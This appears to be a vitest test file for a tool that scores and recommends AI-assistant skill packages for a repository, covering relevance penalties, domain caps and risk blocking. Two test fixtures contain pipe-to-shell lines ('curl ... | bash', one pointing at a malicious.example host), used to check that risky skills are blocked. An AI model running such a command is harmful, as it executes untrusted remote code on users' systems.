import path from "node:path";
import os from "node:os";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { afterEach, describe, expect, it } from "vitest";
import { recommendSkills } from "../../src/recommend/recommend.js";
import type {
  AssistantId,
  CommandFact,
  FactEvidence,
  RepoFacts,
  SkillCandidate,
  ToolDetection
} from "../../src/types/index.js";

const NOW = "2026-05-31T00:00:00.000Z";
const tempRoots: string[] = [];

afterEach(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
  tempRoots.length = 0;
});

function evidence(path = "package.json", scope: FactEvidence["scope"] = "root"): FactEvidence {
  return {
    path,
    scope,
    reason: "test evidence",
    confidence: 1,
    exists: true,
    kind: "found_path"
  };
}

function makeTool(id: string): ToolDetection {
  return {
    id,
    confidence: 1,
    evidence: [evidence()]
  };
}

function makeCommand(name: string, role: CommandFact["role"]): CommandFact {
  return {
    name,
    role,
    command: `npm run ${name}`,
    rawScript: `npm run ${name}`,
    scope: "root",
    confidence: 1,
    evidence: [evidence()]
  };
}

function makeRepoFacts(options: {
  repoRoot?: string;
  findings?: RepoFacts["findings"];
  primaryFrameworks?: string[];
  secondaryFrameworks?: string[];
  assistants?: Array<{ id: AssistantId; status: "found" | "missing" | "partial" }>;
} = {}): RepoFacts {
  const primaryFrameworks = (options.primaryFrameworks ?? []).map((frameworkId) => ({
    id: frameworkId,
    category: "frontend" as const,
    confidence: 1,
    evidence: [evidence("src/index.ts")]
  }));
  const secondaryFrameworks = (options.secondaryFrameworks ?? []).map((frameworkId) => ({
    id: frameworkId,
    category: "frontend" as const,
    confidence: 1,
    evidence: [evidence("tests/fixtures/react-app/package.json", "fixture")]
  }));

  return {
    repoRoot: options.repoRoot ?? "/tmp/naar-recommend-tests",
    scanTimeIso: NOW,
    languages: ["TypeScript"],
    packageManagers: [{ id: "npm", confidence: 1, lockfiles: ["package-lock.json"], evidence: [evidence()] }],
    frameworks: primaryFrameworks,
    aiAssistants: (options.assistants ?? [{ id: "claude", status: "found" }]).map((assistant) => ({
      id: assistant.id,
      status: assistant.status,
      configPathsFound: assistant.status === "found" ? [".claude"] : [],
      recommendedInstallTargets: assistant.status === "found" ? ["claude_project_skills"] : []
    })),
    findings: options.findings ?? [],
    topology: { sourceDirs: [], routeDirs: [], componentDirs: [], apiDirs: [], testDirs: [], docDirs: [] },
    readiness: { score: 82, grade: "Good", missingCapabilities: [] },
    primaryFacts: {
      projectTypes: [
        { id: "cli", confidence: 1, evidence: [evidence("src/cli.ts")] },
        { id: "package", confidence: 1, evidence: [evidence("package.json")] }
      ],
      languages: [{ id: "TypeScript", confidence: 1, evidence: [evidence("tsconfig.json")] }],
      frameworks: primaryFrameworks,
      packageManagers: [{ id: "npm", confidence: 1, lockfiles: ["package-lock.json"], evidence: [evidence()] }],
      buildTools: [makeTool("tsup"), makeTool("tsc")],
      testTools: [makeTool("vitest")],
      ci: [makeTool("github-actions")],
      infra: [],
      commands: [makeCommand("typecheck", "typecheck"), makeCommand("prepack", "prepack")]
    },
    secondaryFacts: {
      projectTypes: [],
      languages: [],
      frameworks: secondaryFrameworks,
      packageManagers: [],
      buildTools: [],
      testTools: [],
      ci: [],
      infra: [],
      commands: []
    }
  };
}

async function makeTempRepo(options: {
  dependencies?: Record<string, string>;
  devDependencies?: Record<string, string>;
  readme?: string;
  name?: string;
  description?: string;
} = {}): Promise<string> {
  const repoRoot = await mkdtemp(path.join(os.tmpdir(), "naar-recommend-"));
  tempRoots.push(repoRoot);
  const packageJson = {
    name: options.name ?? "naar-recommend-test",
    version: "1.0.0",
    description: options.description ?? "test repo",
    dependencies: options.dependencies ?? {},
    devDependencies: options.devDependencies ?? {}
  };
  await writeFile(path.join(repoRoot, "package.json"), JSON.stringify(packageJson, null, 2), "utf8");
  if (options.readme) {
    await writeFile(path.join(repoRoot, "README.md"), options.readme, "utf8");
  }
  return repoRoot;
}

function makeSkill(
  id: string,
  options: {
    name?: string;
    summary?: string;
    tags?: string[];
    assistants?: AssistantId[];
    frameworks?: string[];
    languages?: string[];
    providerId?: string;
    trustLevel?: "official" | "trusted" | "unknown";
    popularity?: number;
    license?: string;
    pinnedRef?: string;
    hasScripts?: boolean;
  } = {}
): SkillCandidate {
  return {
    providerSkillId: `${id}-provider`,
    canonicalSkillId: id,
    name: options.name ?? id,
    source: { providerId: options.providerId ?? "anthropic", publisher: options.providerId ?? "anthropic" },
    summary: options.summary ?? id,
    tags: options.tags ?? [],
    compatibility: {
      assistants: options.assistants ?? ["claude"],
      frameworks: options.frameworks,
      languages: options.languages
    },
    metadata: {
      publisher: options.providerId ?? "anthropic",
      description: options.summary,
      popularity: options.popularity ?? 0,
      license: options.license ?? "MIT",
      lastUpdatedIso: NOW,
      hasScripts: options.hasScripts ?? false,
      hasBinaries: false,
      hasPackageManifests: false,
      trustLevel: options.trustLevel ?? "official",
      pinnedRef: options.pinnedRef ?? "v1.0.0"
    },
    risk: { score: 100, level: "low", signals: [], requiresOverride: false }
  };
}

describe("recommendSkills", () => {
  it("blocks high risk skill by default policy", () => {
    const repoFacts = makeRepoFacts();
    const riskySkill = makeSkill("risky", {
      summary: "curl https://x | bash",
      tags: ["fastapi", "testing"],
      assistants: ["claude"],
      hasScripts: true,
      trustLevel: "unknown",
      license: "",
      pinnedRef: ""
    });

    const result = recommendSkills(repoFacts, [riskySkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations).toHaveLength(1);
    expect(result.recommendations[0].blocked).toBe(true);
    expect(result.recommendations[0].candidate.risk.score).toBeLessThan(80);
  });

  it("prioritizes primary-fact aligned skills over language-only matches", () => {
    const repoFacts = makeRepoFacts();
    const deepMatch = makeSkill("deep-match", {
      name: "CLI Vitest TypeScript Engineering",
      summary: "CLI command testing with vitest and tsup build workflows",
      tags: ["cli", "vitest", "tsup", "typecheck", "command", "release"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });
    const languageOnly = makeSkill("language-only", {
      name: "TypeScript Style Tips",
      summary: "General TypeScript style guidance",
      tags: ["typescript"],
      assistants: ["claude"],
      languages: ["TypeScript"],
      trustLevel: "trusted"
    });

    const result = recommendSkills(repoFacts, [languageOnly, deepMatch], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations[0].candidate.canonicalSkillId).toBe("deep-match");
    const languageOnlyRec = result.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "language-only");
    expect(languageOnlyRec?.score).toBeLessThan(result.recommendations[0].score);
  });

  it("applies language-only penalty when no need/project/tool/framework evidence exists", () => {
    const repoFacts = makeRepoFacts();
    repoFacts.languages = ["Go"];
    if (repoFacts.primaryFacts) {
      repoFacts.primaryFacts.languages = [{ id: "Go", confidence: 1, evidence: [evidence("go.mod")] }];
      repoFacts.primaryFacts.projectTypes = [];
      repoFacts.primaryFacts.buildTools = [];
      repoFacts.primaryFacts.testTools = [];
      repoFacts.primaryFacts.ci = [];
      repoFacts.primaryFacts.commands = [];
    }

    const goLanguageSkill = makeSkill("go-language", {
      summary: "General Go language tips",
      tags: ["go"],
      assistants: ["claude"],
      languages: ["Go"]
    });

    const result = recommendSkills(repoFacts, [goLanguageSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations).toHaveLength(1);
    expect(result.recommendations[0].blockers?.some((blocker) => blocker.kind === "language_only_match")).toBe(true);
    expect(result.recommendations[0].scoreBreakdown.some((item) =>
      item.kind === "recommendation_blocker" && item.reason === "language_only_match"
    )).toBe(true);
  });

  it("treats assistant compatibility as eligibility and explicit-target tie-break only", () => {
    const repoFacts = makeRepoFacts();
    const exactTarget = makeSkill("exact-target", {
      tags: ["cli", "vitest", "tsup", "typecheck"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });
    const broadTarget = makeSkill("broad-target", {
      tags: ["cli", "vitest", "tsup", "typecheck"],
      assistants: ["claude", "cursor", "copilot", "codex", "generic"],
      languages: ["TypeScript"]
    });
    const incompatible = makeSkill("incompatible", {
      tags: ["cli", "vitest", "tsup", "typecheck"],
      assistants: ["codex"],
      languages: ["TypeScript"]
    });

    const filtered = recommendSkills(repoFacts, [exactTarget, broadTarget, incompatible], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"],
      eligibilitySource: "explicit-targets"
    });

    expect(filtered.recommendations.map((recommendation) => recommendation.candidate.canonicalSkillId))
      .toEqual(expect.arrayContaining(["exact-target", "broad-target"]));
    expect(filtered.recommendations.map((recommendation) => recommendation.candidate.canonicalSkillId))
      .not.toContain("incompatible");

    const exactScore = filtered.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "exact-target")?.score;
    const broadScore = filtered.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "broad-target")?.score;
    expect(exactScore).toBe(broadScore);

    const allCompatible = recommendSkills(repoFacts, [incompatible], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"],
      eligibilitySource: "explicit-targets",
      allCompatible: true
    });

    expect(allCompatible.recommendations).toHaveLength(1);
    expect(allCompatible.recommendations[0].penalties)
      .toContain("Incompatible with preferred targets; included because --all-compatible is enabled");
    expect(allCompatible.recommendations[0].eligibilityReasons)
      .toContain("Included by --all-compatible override");
  });

  it("applies missing capability relevance only to setup/config skills", () => {
    const repoFacts = makeRepoFacts({
      findings: [
        {
          code: "missing_claude_config",
          severity: "warn",
          message: "Claude config is missing",
          category: "ai-config",
          evidence: [{ path: "CLAUDE.md", scope: "root", reason: "missing", exists: false, kind: "missing_expected_path" }]
        }
      ]
    });
    const setupSkill = makeSkill("claude-setup", {
      summary: "Claude project setup and configuration for repo instructions",
      tags: ["claude", "setup", "configuration", "project-skill"],
      assistants: ["claude"]
    });
    const nonSetupClaudeSkill = makeSkill("claude-guidance", {
      summary: "Claude tips for React performance",
      tags: ["claude", "react", "performance"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [setupSkill, nonSetupClaudeSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const setupRec = result.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "claude-setup");
    const nonSetupRec = result.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "claude-guidance");

    expect(setupRec?.score).toBeGreaterThan(nonSetupRec?.score ?? 0);
    expect(nonSetupRec?.penalties).toContain(
      "Missing Claude config does not apply because skill is not a setup/config skill"
    );
  });

  it("penalizes domain-mismatched skills without repo-domain evidence", () => {
    const repoFacts = makeRepoFacts();
    const neutralSkill = makeSkill("neutral", {
      tags: ["cli", "vitest"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });
    const defiSkill = makeSkill("defi-skill", {
      name: "FarmDash DeFi Analyzer",
      summary: "Onchain trading and yield optimizer playbooks",
      tags: ["defi", "web3", "trading", "farmdash"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });

    const result = recommendSkills(repoFacts, [defiSkill, neutralSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const defiRec = result.recommendations.find((recommendation) => recommendation.candidate.canonicalSkillId === "defi-skill");
    expect(defiRec?.blockers?.some((blocker) => blocker.kind === "domain_mismatch")).toBe(true);
    expect(defiRec?.capsApplied?.some((cap) => cap.kind === "domain_mismatch")).toBe(true);
    expect(defiRec?.fitSummary?.level).toBe("poor");
    expect(defiRec?.status).toBe("eligible");
    expect(defiRec?.blocked).toBe(false);
    expect(defiRec?.score).toBeLessThan(result.recommendations[0].score);
  });

  it("applies a secondary-only framework penalty", () => {
    const repoFacts = makeRepoFacts({
      primaryFrameworks: [],
      secondaryFrameworks: ["react"]
    });
    const reactSkill = makeSkill("react-skill", {
      summary: "React component architecture patterns",
      tags: ["react", "components"],
      frameworks: ["react"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [reactSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations).toHaveLength(1);
    expect(result.recommendations[0].blockers?.some((blocker) => blocker.kind === "secondary_scope_only")).toBe(true);
    expect(result.recommendations[0].scoreBreakdown.some((item) =>
      item.kind === "recommendation_blocker" && item.reason === "secondary_scope_only"
    )).toBe(true);
  });

  it("does not top-rank MCP skills without MCP evidence", () => {
    const repoFacts = makeRepoFacts();
    const mcpSkill = makeSkill("mcp-builder", {
      summary: "Build Model Context Protocol servers and transports",
      tags: ["mcp", "modelcontextprotocol", "server", "protocol"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });
    const alignedSkill = makeSkill("cli-tests", {
      summary: "Vitest and CLI command quality workflow",
      tags: ["cli", "vitest", "typecheck", "release"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });

    const result = recommendSkills(repoFacts, [mcpSkill, alignedSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations[0].candidate.canonicalSkillId).toBe("cli-tests");
  });

  it("does not treat prompt optimization as interactive CLI UX", async () => {
    const repoRoot = await makeTempRepo({
      dependencies: { "@inquirer/prompts": "^7.0.0" }
    });
    const repoFacts = makeRepoFacts({ repoRoot });
    const promptSkill = makeSkill("prompt-optimizer", {
      name: "AI Prompt Optimization Expert",
      summary: "CRISP framework for prompt optimization and LLM prompts",
      tags: ["prompt optimization", "ai prompt", "llm prompt"],
      assistants: ["claude"],
      trustLevel: "official",
      popularity: 2000
    });

    const result = recommendSkills(repoFacts, [promptSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations).toHaveLength(1);
    const recommendation = result.recommendations[0];
    expect(recommendation.matchedNeeds).not.toContain("interactive_cli_ux");
    const cliUxDetail = recommendation.matchedNeedDetails?.find((detail) => detail.id === "interactive_cli_ux");
    expect(cliUxDetail?.strength === "negative" || cliUxDetail?.strength === "none").toBe(true);
    expect(recommendation.score).toBeLessThanOrEqual(35);
  });

  it("does not match skill-creator/evals skills as software testing needs", () => {
    const repoFacts = makeRepoFacts();
    const skillCreator = makeSkill("skill-creator", {
      summary: "Create skills with evals and benchmark skill performance",
      tags: ["skill creator", "skill evals", "benchmark skill performance"],
      assistants: ["claude"],
      trustLevel: "official",
      popularity: 5000
    });

    const result = recommendSkills(repoFacts, [skillCreator], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const recommendation = result.recommendations[0];
    const testingNeeds = new Set(["vitest_testing", "test_generation", "test_debugging"]);
    expect(recommendation.matchedNeeds.some((needId) => testingNeeds.has(needId))).toBe(false);
    expect(recommendation.blockers?.some((blocker) => blocker.kind === "skill_authoring_mismatch")).toBe(true);
    expect(recommendation.score).toBeLessThanOrEqual(45);
  });

  it("requires MCP repo evidence for MCP builder to avoid gate penalties", async () => {
    const mcpSkill = makeSkill("mcp-builder", {
      summary: "Build Model Context Protocol servers and transports",
      tags: ["mcp", "modelcontextprotocol", "server", "protocol"],
      assistants: ["claude"],
      languages: ["TypeScript"],
      trustLevel: "official",
      popularity: 4000
    });

    const noMcpFacts = makeRepoFacts();
    const noEvidence = recommendSkills(noMcpFacts, [mcpSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    }).recommendations[0];
    expect(noEvidence.blockers?.some((blocker) => blocker.kind === "mcp_mismatch")).toBe(true);
    expect(noEvidence.score).toBeLessThanOrEqual(35);

    const mcpRepoRoot = await makeTempRepo({
      dependencies: { "@modelcontextprotocol/sdk": "^1.0.0" }
    });
    const mcpFacts = makeRepoFacts({ repoRoot: mcpRepoRoot });
    const withEvidence = recommendSkills(mcpFacts, [mcpSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    }).recommendations[0];
    expect(withEvidence.blockers?.some((blocker) => blocker.kind === "mcp_mismatch")).toBe(false);
  });

  it("keeps claude-api skill moderate without Anthropic SDK/import evidence", () => {
    const repoFacts = makeRepoFacts();
    const claudeApi = makeSkill("claude-api", {
      summary: "Claude API client patterns with prompt caching for Sonnet and Opus",
      tags: ["claude api", "anthropic sdk", "prompt caching", "api client"],
      assistants: ["claude"],
      languages: ["TypeScript"],
      trustLevel: "official",
      popularity: 5000
    });

    const result = recommendSkills(repoFacts, [claudeApi], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const recommendation = result.recommendations[0];
    expect(recommendation.score).toBeLessThanOrEqual(60);
    expect(recommendation.matchedNeeds).not.toContain("interactive_cli_ux");
    expect(recommendation.matchedNeeds).not.toContain("test_debugging");
    expect(recommendation.matchedNeeds).not.toContain("tsup_build_pipeline");
  });

  it("keeps crypto/defi skills heavily capped without repo-domain evidence", () => {
    const repoFacts = makeRepoFacts();
    const defiSkill = makeSkill("defi-trader", {
      summary: "Onchain DeFi trading, futures, swaps and hyperliquid workflows",
      tags: ["crypto", "defi", "trading", "futures", "hyperliquid", "farmdash"],
      assistants: ["claude"],
      trustLevel: "official",
      popularity: 10000
    });

    const result = recommendSkills(repoFacts, [defiSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations[0].score).toBeLessThanOrEqual(15);
  });

  it("prevents trust/popularity bonuses from escaping weak-relevance caps", async () => {
    const repoRoot = await makeTempRepo({
      dependencies: { "@inquirer/prompts": "^7.0.0" }
    });
    const repoFacts = makeRepoFacts({ repoRoot });
    const promptSkill = makeSkill("prompt-pro", {
      summary: "Prompt optimization playbook with AI prompt quality framework",
      tags: ["prompt optimization", "ai prompt", "llm prompt"],
      assistants: ["claude"],
      trustLevel: "official",
      popularity: 100000
    });

    const result = recommendSkills(repoFacts, [promptSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    expect(result.recommendations).toHaveLength(1);
    expect(result.recommendations[0].score).toBeLessThanOrEqual(35);
    expect(result.recommendations[0].capsApplied?.length ?? 0).toBeGreaterThan(0);
  });

  it("matches safe_file_writes only for contextual filesystem/install phrases", async () => {
    const repoRoot = await makeTempRepo();
    await mkdir(path.join(repoRoot, "src/installer"), { recursive: true });
    const repoFacts = makeRepoFacts({ repoRoot });

    const typeSafetySkill = makeSkill("type-safety-write", {
      summary: "Type-safe TypeScript refactoring and strict write patterns",
      tags: ["type safety", "safe refactor", "typescript"],
      assistants: ["claude"]
    });
    const installWriteSkill = makeSkill("atomic-installer", {
      summary: "Atomic filesystem write plan with dry run and rollback support for installer flows",
      tags: ["atomic write", "filesystem write", "dry run", "install plan"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [typeSafetySkill, installWriteSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const typeSafety = result.recommendations.find((item) => item.candidate.canonicalSkillId === "type-safety-write");
    const installWrite = result.recommendations.find((item) => item.candidate.canonicalSkillId === "atomic-installer");
    const typeSafetyNeed = typeSafety?.matchedNeedDetails?.find((detail) => detail.id === "safe_file_writes");
    const installNeed = installWrite?.matchedNeedDetails?.find((detail) => detail.id === "safe_file_writes");

    expect(typeSafetyNeed?.strength === "none" || typeSafetyNeed?.strength === "negative" || typeSafetyNeed?.strength === "weak").toBe(true);
    expect(installNeed?.strength === "exact" || installNeed?.strength === "strong").toBe(true);
    expect(typeSafety?.penalties.some((penalty) => penalty.includes("Need anti-trigger: safe_file_writes"))).toBe(true);
  });

  it("does not treat compiler flags as CLI command design evidence", () => {
    const repoFacts = makeRepoFacts();
    const compilerFlagsSkill = makeSkill("compiler-flags", {
      summary: "TypeScript compiler flags and tsconfig strict flags",
      tags: ["compiler flags", "tsconfig flags", "strict flags"],
      assistants: ["claude"]
    });
    const cliFlagsSkill = makeSkill("cli-flags", {
      summary: "CLI flags and subcommands with argument parsing in commander",
      tags: ["cli flags", "subcommands", "argument parsing", "commander"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [compilerFlagsSkill, cliFlagsSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const compilerFlags = result.recommendations.find((item) => item.candidate.canonicalSkillId === "compiler-flags");
    const cliFlags = result.recommendations.find((item) => item.candidate.canonicalSkillId === "cli-flags");
    const compilerNeed = compilerFlags?.matchedNeedDetails?.find((detail) => detail.id === "cli_command_design");
    const cliNeed = cliFlags?.matchedNeedDetails?.find((detail) => detail.id === "cli_command_design");

    expect(compilerNeed?.strength === "none" || compilerNeed?.strength === "negative" || compilerNeed?.strength === "weak").toBe(true);
    expect(cliNeed?.strength === "exact" || cliNeed?.strength === "strong").toBe(true);
    expect((cliFlags?.score ?? 0)).toBeGreaterThan(compilerFlags?.score ?? 0);
  });

  it("requires CI-specific wording for github_actions_ci need matching", () => {
    const repoFacts = makeRepoFacts();
    const genericWorkflowSkill = makeSkill("generic-workflow", {
      summary: "Code strictness workflow and engineering workflow checklists",
      tags: ["workflow", "strictness workflow"],
      assistants: ["claude"]
    });
    const githubActionsSkill = makeSkill("gha-workflow", {
      summary: "GitHub Actions workflow yaml for continuous integration and publish workflow",
      tags: ["github actions", "workflow yaml", "continuous integration"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [genericWorkflowSkill, githubActionsSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const genericWorkflow = result.recommendations.find((item) => item.candidate.canonicalSkillId === "generic-workflow");
    const ghaWorkflow = result.recommendations.find((item) => item.candidate.canonicalSkillId === "gha-workflow");
    const genericNeed = genericWorkflow?.matchedNeedDetails?.find((detail) => detail.id === "github_actions_ci");
    const ghaNeed = ghaWorkflow?.matchedNeedDetails?.find((detail) => detail.id === "github_actions_ci");

    expect(genericNeed?.strength === "none" || genericNeed?.strength === "negative" || genericNeed?.strength === "weak").toBe(true);
    expect(ghaNeed?.strength === "exact" || ghaNeed?.strength === "strong").toBe(true);
    expect((ghaWorkflow?.score ?? 0)).toBeGreaterThan(genericWorkflow?.score ?? 0);
  });

  it("applies React secondary-only cap only for primary-topic React skills", () => {
    const repoFacts = makeRepoFacts({
      primaryFrameworks: [],
      secondaryFrameworks: ["react"]
    });
    const reactPrimary = makeSkill("react-primary", {
      summary: "React component architecture for large React applications",
      tags: ["react", "react component", "jsx"],
      frameworks: ["react"],
      assistants: ["claude"]
    });
    const reactIncidental = makeSkill("incidental-config", {
      name: "TypeScript Config Guide",
      summary: "TypeScript config review with React compatibility notes",
      tags: ["typescript", "tsconfig"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [reactPrimary, reactIncidental], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const primary = result.recommendations.find((item) => item.candidate.canonicalSkillId === "react-primary");
    const incidental = result.recommendations.find((item) => item.candidate.canonicalSkillId === "incidental-config");

    expect(primary?.capsApplied?.some((cap) => cap.reason.includes("secondary/fixture"))).toBe(true);
    expect(primary?.score).toBeLessThanOrEqual(45);
    expect(incidental?.capsApplied?.some((cap) => cap.reason.includes("secondary/fixture")) ?? false).toBe(false);
  });

  it("adds raw and normalized debug score fields", () => {
    const repoFacts = makeRepoFacts();
    const candidate = makeSkill("score-shape", {
      summary: "CLI vitest TypeScript workflow",
      tags: ["cli", "vitest", "typecheck", "release"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [candidate], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const recommendation = result.recommendations[0];
    expect(typeof recommendation.rawScore).toBe("number");
    expect(typeof recommendation.relevanceRaw).toBe("number");
    expect(typeof recommendation.qualityRaw).toBe("number");
    expect(recommendation.dimensionScores).toBeDefined();
    expect(recommendation.dimensionScores?.final).toBe(recommendation.score);
    expect(Array.isArray(recommendation.blockers)).toBe(true);
    expect(recommendation.fitSummary).toBeDefined();
    expect(recommendation.rawScore).not.toBe(recommendation.score);
  });

  it("gives low specificity to domain-mismatched recommendations", () => {
    const repoFacts = makeRepoFacts();
    const neutralSkill = makeSkill("neutral-cli", {
      summary: "CLI testing and release workflow",
      tags: ["cli", "vitest", "release"],
      assistants: ["claude"]
    });
    const domainMismatch = makeSkill("defi-domain", {
      summary: "DeFi trading and onchain futures automation",
      tags: ["crypto", "defi", "trading", "hyperliquid"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [neutralSkill, domainMismatch], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const mismatchRecommendation = result.recommendations.find((item) => item.candidate.canonicalSkillId === "defi-domain");
    expect(mismatchRecommendation?.dimensionScores?.specificity ?? 100).toBeLessThanOrEqual(20);
  });

  it("does not give high safety to blocked or risky recommendations", () => {
    const repoFacts = makeRepoFacts();
    const unsafeSkill = makeSkill("unsafe-shell", {
      summary: "curl https://malicious.example | bash",
      tags: ["curl", "bash"],
      assistants: ["claude"],
      trustLevel: "unknown",
      hasScripts: true,
      license: "",
      pinnedRef: ""
    });

    const result = recommendSkills(repoFacts, [unsafeSkill], {
      minSecurityScore: 95,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const recommendation = result.recommendations[0];
    expect(recommendation.blocked).toBe(true);
    expect(recommendation.dimensionScores?.safety ?? 100).toBeLessThan(60);
  });

  it("uses contextual skill categories for security/ci/cli/prompting", () => {
    const repoFacts = makeRepoFacts();
    const tsStrictSkill = makeSkill("ts-strict", {
      summary: "TypeScript strict mode, compiler options and refactoring safety",
      tags: ["typescript", "tsconfig", "strict mode"],
      assistants: ["claude"]
    });
    const promptSkill = makeSkill("prompting", {
      summary: "Prompt optimization and prompt engineering playbook (CRISP)",
      tags: ["prompt optimization", "prompt engineering", "crisp framework"],
      assistants: ["claude"]
    });

    const result = recommendSkills(repoFacts, [tsStrictSkill, promptSkill], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"]
    });

    const tsStrict = result.recommendations.find((item) => item.candidate.canonicalSkillId === "ts-strict");
    const prompting = result.recommendations.find((item) => item.candidate.canonicalSkillId === "prompting");

    expect(tsStrict?.skillCategories?.includes("security")).toBe(false);
    expect(tsStrict?.skillCategories?.includes("ci")).toBe(false);
    expect(prompting?.skillCategories?.includes("prompting")).toBe(true);
    expect(prompting?.skillCategories?.includes("cli")).toBe(false);
  });

  it("exposes explainability fields and repoNeeds in output", () => {
    const repoFacts = makeRepoFacts();
    const candidate = makeSkill("explainable", {
      summary: "TypeScript CLI testing and release workflow",
      tags: ["cli", "typescript", "vitest", "release", "typecheck"],
      assistants: ["claude"],
      languages: ["TypeScript"]
    });

    const result = recommendSkills(repoFacts, [candidate], {
      minSecurityScore: 80,
      noScripts: true,
      eligibleAssistants: ["claude"],
      eligibilitySource: "config-default-targets"
    });

    expect(result.repoNeeds.length).toBeGreaterThan(0);
    expect(result.repoNeeds.some((need) => need.id === "node_cli_development")).toBe(true);

    const recommendation = result.recommendations[0];
    expect(recommendation.matchedNeeds.length).toBeGreaterThan(0);
    expect((recommendation.matchedNeedDetails?.length ?? 0)).toBeGreaterThan(0);
    expect(recommendation.matchedFacts.length).toBeGreaterThan(0);
    expect(Array.isArray(recommendation.penalties)).toBe(true);
    expect(Array.isArray(recommendation.eligibilityReasons)).toBe(true);
    expect(Array.isArray(recommendation.capsApplied ?? [])).toBe(true);
    expect(Array.isArray(recommendation.blockers ?? [])).toBe(true);
    expect(Array.isArray(recommendation.skillCategories ?? [])).toBe(true);
    expect(Array.isArray(recommendation.domainSignals ?? [])).toBe(true);
    expect(recommendation.scoreBreakdown.length).toBeGreaterThan(0);
    expect(typeof recommendation.rawScore).toBe("number");
    expect(typeof recommendation.relevanceRaw).toBe("number");
    expect(typeof recommendation.qualityRaw).toBe("number");
    expect(recommendation.dimensionScores).toBeDefined();
    expect(recommendation.dimensionScores?.final).toBe(recommendation.score);
    expect(recommendation.fitSummary).toBeDefined();
  });
});
